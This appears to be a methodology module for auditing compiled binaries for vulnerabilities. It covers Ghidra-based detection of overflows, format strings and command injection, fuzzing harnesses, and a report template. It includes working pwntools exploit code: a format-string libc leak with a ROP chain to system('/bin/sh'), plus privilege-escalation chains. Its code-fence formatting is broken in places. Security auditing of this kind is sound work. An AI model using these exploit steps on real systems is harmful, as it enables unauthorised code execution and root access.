# ASSET MODULE — Executable / Binary
# Covers: ELF (Linux), PE (Windows), Mach-O (macOS)
# Report ID prefix: EXE
# Requires: Ghidra MCP server connected

## THREAT MODEL

Binary vulnerabilities allow attackers to:
  - Corrupt memory to redirect execution (buffer overflow, heap overflow)
  - Leak memory to bypass ASLR/stack canaries (info leak)
  - Achieve arbitrary code execution via ROP chains
  - Escalate privileges if the binary runs as SUID or service
  - Abuse logic flaws without memory corruption (command injection, path traversal)
  - Exploit cryptographic weaknesses (hardcoded keys, weak RNG)
  - Abuse concurrency issues (race conditions, TOCTOU)

Most critical context: is this binary SUID, a network daemon, or processing untrusted files?
If yes, memory corruption is immediately Critical.

---

## VULNERABILITY CLASSES (priority order with detection patterns)

| Priority | Class | CWE | Ghidra Detection Pattern | Real-world Impact |
|----------|-------|-----|--------------------------|-------------------|
| 1 | Stack Buffer Overflow | CWE-121 | `strcpy`, `sprintf`, `gets`, `scanf("%s")` with local buffer | RCE, privilege escalation |
| 2 | Heap Buffer Overflow | CWE-122 | `malloc(size)` where `size` is user-controlled, then `memcpy` with larger len | RCE, heap metadata corruption |
| 3 | Use-After-Free | CWE-416 | `free(ptr)` followed by function call using same ptr without reallocation | RCE, info leak |
| 4 | Format String | CWE-134 | `printf(var)` where var is user-controlled, not `printf("%s", var)` | Memory read/write, RCE |
| 5 | Integer Overflow | CWE-190 | `malloc(a * b)` where a or b user-controlled, no bounds check | Heap overflow, RCE |
| 6 | Command Injection | CWE-78 | `system(user_input)`, `popen(user_input)`, `exec*` with unsanitized args | RCE |
| 7 | Path Traversal | CWE-22 | `open(user_path)`, `fopen(user_path)` without path sanitization | File read/write |
| 8 | Insecure Deserialization | CWE-502 | `unserialize`, `pickle.loads`, custom binary parsers with user input | RCE, logic bypass |
| 9 | Race Condition (TOCTOU) | CWE-367 | `access()` + `open()`, `stat()` + `open()` with time gap | File corruption, privilege escalation |
| 10 | Hardcoded Credentials | CWE-798 | String literals containing "password", "secret", "key", "token" | Authentication bypass |
| 11 | Logic Flaw | CWE-573 | Authentication check missing branch, incorrect state machine | Privilege escalation |
| 12 | Cryptographic Weakness | CWE-326 | Hardcoded key, ECB mode, custom crypto, predictable RNG | Data exposure |
| 13 | Integer Signedness | CWE-195 | Signed/unsigned mismatch in length checks | Heap overflow, OOB read |

---

## WHITEBOX STATIC ANALYSIS — GHIDRA AUTOMATED

### Step 1 — Automated binary reconnaissance via MCP

```markdown
**Ghidra MCP Commands:**

1. Load binary and get basic info:
mcp_ghidra_load /path/to/binary
mcp_ghidra_info

text

2. Get security mitigations (requires analysis):
mcp_ghidra_analyze_security

text
Expected output: RELRO (Full/Partial/None), Canary (Yes/No), NX (Yes/No), PIE (Yes/No)

3. List all functions with metadata:
mcp_ghidra_functions --details

text
Output: function name, address, size, is_external, parameters

4. Find dangerous function calls:
mcp_ghidra_find_calls --function system,strcpy,strcat,sprintf,gets,printf,memcpy,malloc,free,execve,open

text

5. Get cross-references to user input sinks:
mcp_ghidra_xrefs --to main,handle_input,process_request --type read

text

6. Decompile specific function:
mcp_ghidra_decompile --function main
mcp_ghidra_decompile --address 0x00401234

text
Step 2 — Automated vulnerability detection pipeline
markdown
**Run this sequence for each binary:**

#### 2.1 — Stack overflow detection
mcp_ghidra_find_pattern --pattern "strcpy|strcat|sprintf|gets|scanf.%s|fgets.size"

text
For each result:
- Identify the destination buffer size (trace back to declaration)
- Determine if input length is validated before copy
- Check if buffer is on stack (local variable) or heap
- Flag if: destination buffer < source length AND no validation

**Automated analysis output:**
[EXE-001] Stack Buffer Overflow (CWE-121)
Function: handle_request at 0x00401234
Sink: strcpy(dest, user_input) at 0x00401256
Buffer: char dest[64] at rbp-0x40
Source: user_input controlled via recv() at 0x00401200
Validation: NONE
Severity: Critical (if SUID or network-facing)

text

#### 2.2 — Format string detection
mcp_ghidra_find_pattern --pattern "printf|fprintf|sprintf|syslog|fwrite"
mcp_ghidra_analyze_format_string

text
Check if format string is:
- Literal (`printf("Hello")` → safe)
- Variable from user input (`printf(buffer)` → vulnerable)
- Global constant (`printf(GREETING)` → safe if constant)

**Detection logic:**
- Trace argument to `printf` call
- If argument is a pointer to stack/heap variable that receives user input → VULNERABLE
- If argument is a pointer to `.rodata` section → SAFE

#### 2.3 — Command injection detection
mcp_ghidra_find_calls --function system,popen,execve,execl,execlp,execvp,execv,WinExec,CreateProcess,ShellExecute
mcp_ghidra_trace_back --to user_input

text
For each call:
- Is the command string built from user input?
- Is there sanitization? (look for `strstr` with blacklist, or regex)
- Is the binary SUID? → escalation potential

**Automated analysis output:**
[EXE-002] Command Injection (CWE-78)
Function: exec_backup at 0x00408900
Sink: system(cmd) at 0x00408942
Command construction: sprintf(cmd, "tar -czf /tmp/%s", user_filename)
Sanitization: none detected
Context: SUID binary (file mode 4755)
Severity: Critical (local privilege escalation)

text

#### 2.4 — Integer overflow detection
mcp_ghidra_find_pattern --pattern "malloc|calloc|realloc|alloca|new.*["
mcp_ghidra_analyze_integer_math

text
Look for patterns:
```c
size = user_controlled;
buffer = malloc(size * sizeof(struct));  // overflow if size > INT_MAX/sizeof
memcpy(buffer, user_data, user_len);     // heap overflow
Detection:

Find multiplication in arguments to allocation functions

Trace operands to user input

Check if multiplication result is checked against max size

Flag if overflow could lead to undersized allocation

2.5 — Use-after-free detection
text
mcp_ghidra_find_pattern --pattern "free|delete"
mcp_ghidra_trace_lifetime
For each free:

Is the pointer used again after free? (look for calls to the same pointer)

Is the pointer NULL after free? (check for ptr = NULL after free)

Are there branches that skip reallocation?

Pattern:

text
ptr = malloc(1024);
... use ptr ...
free(ptr);
... later in code ...
if (condition) {
    use(ptr);  // UAF if condition true and ptr not reallocated
}
2.6 — ROP gadget discovery (for exploit development)
text
mcp_ghidra_find_gadgets --type ret,push_pop,syscall
Output useful ROP primitives:

pop rdi; ret — for setting first argument

pop rsi; ret — for setting second argument

pop rdx; ret — for third argument

syscall; ret — for direct syscalls

mov [rax], rdx; ret — for write-what-where primitives

DYNAMIC TESTING — AUTOMATED WITH GDB/PWNTOOLS
Step 1 — Crash detection with GDB automation
python
# poc.py — automated crash detection
import subprocess
import pwn

def test_crash(binary_path, offset_start=64, offset_end=512, step=8):
    """Find crashing offset automatically"""
    for length in range(offset_start, offset_end, step):
        payload = b'A' * length
        try:
            p = pwn.process(binary_path)
            p.sendline(payload)
            p.wait(timeout=2)
        except:
            print(f"[!] Crash at length: {length}")
            return length
    return None

def find_offset(binary_path, crash_length):
    """Find exact offset to instruction pointer"""
    pattern = pwn.cyclic(crash_length)
    p = pwn.process(binary_path)
    p.sendline(pattern)
    p.wait()
    # Parse core dump or crash output
    crash_addr = pwn.cyclic_find(0x61616161)  # adjust based on actual crash
    return crash_addr
Step 2 — Fuzzing with AFL++ via Ghidra harness generation
markdown
**When Ghidra identifies input sinks, generate fuzzing harness:**

1. Identify input function (e.g., `read`, `recv`, `fgets`)
2. Extract parameter information:
   - Buffer address
   - Maximum length
3. Generate harness:
```c
// harness.c — fuzz the identified function
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

// Target function from Ghidra analysis
extern void vulnerable_function(char *input);

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Copy input to buffer with proper bounds
    char buf[4096];
    if (size < sizeof(buf)) {
        memcpy(buf, data, size);
        buf[size] = 0;
        vulnerable_function(buf);
    }
    return 0;
}
Compile and fuzz:

bash
clang -fsanitize=fuzzer,address -o harness harness.c target.o
./harness -max_len=4096 corpus/
Step 3 — ASLR bypass via info leak
python
# aslr_bypass.py — leak and exploit
from pwn import *

def exploit_with_leak(binary, libc):
    elf = ELF(binary)
    libc = ELF(libc)
    
    # Step 1: Find info leak primitive via Ghidra analysis
    # Look for: printf(user_input) or read() that returns heap address
    
    # Step 2: Craft leak payload
    leak_payload = b"%p.%p.%p.%p.%p.%p"
    p = process(binary)
    p.sendline(leak_payload)
    leaks = p.recvline().split(b'.')
    
    # Step 3: Calculate libc base
    libc_leak = int(leaks[3], 16)
    libc_base = libc_leak - libc.symbols['__libc_start_main'] - 128
    
    # Step 4: Build ROP chain
    pop_rdi = 0x00401234  # from Ghidra gadget search
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    system = libc_base + libc.symbols['system']
    
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)
    
    p.sendline(payload)
    p.interactive()
IMPACT ESCALATION MATRIX
Binary Context	Stack Overflow	Heap Overflow	UAF	Format String	Command Injection
SUID root	Critical	Critical	Critical	Critical	Critical
Network daemon (remote)	Critical	Critical	Critical	High	Critical
Setuid non-root	High	High	High	High	High
Service with privileges	High	High	Medium	Medium	High
File parser	Medium	Medium	Medium	Low	Low
CLI tool (local only)	Medium	Medium	Low	Low	Medium
CTF/isolated	Low	Low	Low	Low	Low
Context detection via Ghidra:

text
mcp_ghidra_check_context
Detect setuid(0), seteuid(0) calls → SUID indicator

Detect socket, bind, listen calls → network service

Detect open, fopen on user-provided paths → file parser

Check file permissions (via ls -l) → setuid/setgid bits

REPORT TEMPLATE — EXE Finding
json
{
  "report_id": "EXE-XXX",
  "vulnerability_class": "Stack Buffer Overflow",
  "cwe": "CWE-121",
  "severity": "Critical",
  "confirmation_status": "confirmed",
  
  "binary_info": {
    "path": "/usr/local/bin/vuln",
    "arch": "x86_64",
    "mitigations": {
      "relro": "Partial",
      "canary": "No",
      "nx": "Yes",
      "pie": "No"
    },
    "context": "SUID root binary",
    "ghidra_analysis_id": "analysis_20240324_001"
  },
  
  "vulnerability_details": {
    "function": "handle_connection",
    "address": "0x00401234",
    "sink": "strcpy(dest, user_input)",
    "buffer": "char dest[64] at rbp-0x40",
    "source": "read(connection_fd, user_input, 1024)",
    "offset_to_rip": 72,
    "rop_gadgets": [
      "0x0040123c: pop rdi; ret",
      "0x0040123e: pop rsi; ret",
      "0x00401240: pop rdx; ret"
    ]
  },
  
  "exploit_notes": {
    "aslr_bypass_required": true,
    "pie_bypass_required": false,
    "canary_bypass_required": false,
    "rop_chain_required": true,
    "recommended_payload": "ROP chain to execve('/bin/sh', NULL, NULL)"
  },
  
  "poc": "python3 exploit.py --target /usr/local/bin/vuln",
  
  "ghidra_artifacts": [
    "decompiled_function_handle_connection.c",
    "call_graph_handle_connection.svg",
    "data_flow_user_input.png"
  ],
  
  "researcher_notes": "Binary is SUID root with no stack canary. Offset 72 bytes to RIP. PIE disabled, ASLR must be bypassed via info leak. ROP gadgets found at addresses above. Recommend chaining with info leak from format string bug (EXE-002) for reliable exploit."
}
CHAIN POSSIBILITIES WITH BINARY VULNS
Chain	Step 1	Step 2	Result
Format String → RCE	Format string leak (libc, stack)	ROP chain via overflow	Reliable RCE with ASLR bypass
Info leak → Buffer Overflow	Read() returns heap/stack address	Overflow with known offsets	ASLR bypassed
UAF → Code Execution	UAF gives dangling pointer	Heap spray with ROP gadgets	Arbitrary code execution
Command Injection → SUID	Inject command via system()	Execute as root via SUID	Privilege escalation
Integer Overflow → Heap Overflow	Overflow allocation size	Heap spray with large payload	RCE via heap metadata
Path Traversal → File Write	Write to /etc/passwd	Execute SUID binary	Root escalation
Race Condition → File Overwrite	TOCTOU on critical file	Overwrite config/cron	Privilege escalation
GHIDRA MCP INTEGRATION CHEATSHEET
bash
# Full automated analysis pipeline
mcp_ghidra_load /path/to/binary
mcp_ghidra_analyze --all --timeout 300

# Get security report
mcp_ghidra_security_report --format json

# Extract all dangerous functions with context
mcp_ghidra_dangerous_functions --output vulnerable_functions.json

# Generate ROP gadget list
mcp_ghidra_gadgets --type rop --min_instructions 2 --max_instructions 6

# Find all user-controlled data flows
mcp_ghidra_dataflow --sink strcpy,printf,system,malloc

# Export decompiled code for review
mcp_ghidra_export --function vulnerable_function --format c
VERIFICATION CHECKLIST
Binary loaded in Ghidra, analysis complete

Security mitigations identified (checksec)

All dangerous function calls catalogued

User input sources traced to sinks

Crash offset confirmed via dynamic testing

ROP gadgets enumerated (if needed)

Context determined (SUID, network, file parser)

Chain opportunities identified with other findings

PoC exploit written and tested

Ghidra artifacts attached to report

text

---
